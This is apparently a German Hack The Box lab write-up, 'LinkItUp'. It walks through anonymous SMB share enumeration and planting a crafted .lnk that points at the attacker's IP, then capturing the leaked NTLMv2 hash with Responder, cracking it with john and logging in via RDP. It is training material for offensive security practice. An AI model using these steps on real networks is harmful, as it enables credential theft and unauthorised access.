---
tags: [htb, windows, easy, writeup]
cve: none (Mark of the Web, kein CVE)
techniques: [smb-enum, ntlm-leak, hash-cracking]
---
# LinkItUp (HTB)

| Feld               | Wert            |
| ------------------ | --------------- |
| OS                 | Windows         |
| Difficulty         | Easy            |
| Box IP             | `10.129.234.64` |
| Attacker IP (tun0) | `<tun0-ip>`     |

> [!info] Kill Chain
> [[SMB Enumeration]] (anon Share) → bösartige `.lnk` auf Share → Opfer-Rechtsklick löst [[NTLM Hash Leak]] aus → Hash via [[Responder]] gefangen → [[Hash Cracking]] (john) → Creds → RDP → **Flag**

> [!note] Die Lücke
> Rechtsklick auf eine präparierte `.lnk` leakt den **NTLMv2-Hash** (alle Windows-Versionen). Microsoft: durch *Mark of the Web* bei Internet-Downloads blockiert → **kein CVE**. Dateien auf **Shares** sind aber trotzdem verwundbar.

---

# 1 · Enumeration

## Ports → [[nmap]]
```bash
nmap -sV -sC 10.129.234.64
```
- `-sV` = Dienst-Versionen, `-sC` = Standard-Skripte
- SMB (445) + RDP (3389) offen → Angriffsweg: Einstieg über SMB, finaler Zugriff per RDP

## Shares anonym → [[SMB Enumeration]]
```bash
smbclient -L //10.129.234.64/share -N
# => beschreibbarer Share gefunden
```
- `-N` = ohne Passwort (Null-Session), prüft anonymen Zugriff → bei fehlkonfigurierten Shares häufig möglich
- Share muss **beschreibbar** sein (nicht nur lesbar) → sonst lässt sich keine eigene Datei ablegen

---

# 2 · Credential Access → [[NTLM Hash Leak]]

## 2.1 Bösartige `.lnk` bauen
`poc.c` so anpassen, dass die `.lnk` auf die **eigene IP** zeigt (`\\<tun0-ip>\share`).
```bash
x86_64-w64-mingw32-gcc -o poc poc.c   # unter Linux kompilieren => poc.exe
wine poc.exe                          # .exe ausführen => poc.lnk
```
> `mingw32-gcc` kompiliert Windows-Binaries unter Linux, `wine` führt sie aus.
- eine `.lnk` kann auf eine Netzwerk-Adresse verweisen → verweist sie auf mich, baut das Opfer-System beim bloßen Anzeigen eine SMB-Verbindung auf und übermittelt dabei den NTLM-Hash
- im `poc.c` die **eigene tun0-IP** eintragen, nicht die der Box (sonst wird der Hash an die falsche Adresse gesendet)

## 2.2 `.lnk` auf den Share legen
```bash
smbclient //10.129.234.64/share -N -c 'put poc.lnk'
```
- `put` lädt die Datei auf den Share → wird später vom simulierten User geöffnet
- das bloße Anzeigen im Explorer genügt (Icon-Rendering, kein Klick nötig) → Hash wird übertragen

## 2.3 Hash abfangen → [[Responder]]
```bash
responder -I tun0 -P
# wartet auf SMB-Auth; Opfer-Rechtsklick => NTLMv2-Hash erscheint
```
- Responder emuliert den SMB-Server, nimmt die Authentifizierung entgegen und protokolliert den Hash
- `-I tun0` = lauscht auf dem VPN-Interface → warten, bis der Hash in der Konsole erscheint

## 2.4 Hash cracken → [[Hash Cracking]]
```bash
john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt
# => Klartext-Passwort
```
- NTLMv2 ist nicht für Pass-the-Hash geeignet → muss offline geknackt werden, um das Klartext-Passwort zu erhalten
- `john` hasht jedes Wort aus `rockyou.txt` und vergleicht mit dem Ziel-Hash → Treffer = Passwort

---

# 3 · Zugriff → Flag

```bash
xfreerdp3 /v:10.129.234.64 /u:<user> /p:<password> /cert:ignore
# => Desktop, Flag auslesen
```
- mit den Credentials per RDP (3389) anmelden. `/cert:ignore` akzeptiert das selbstsignierte Zertifikat
- Zugriff auf den Desktop → Flag auslesen
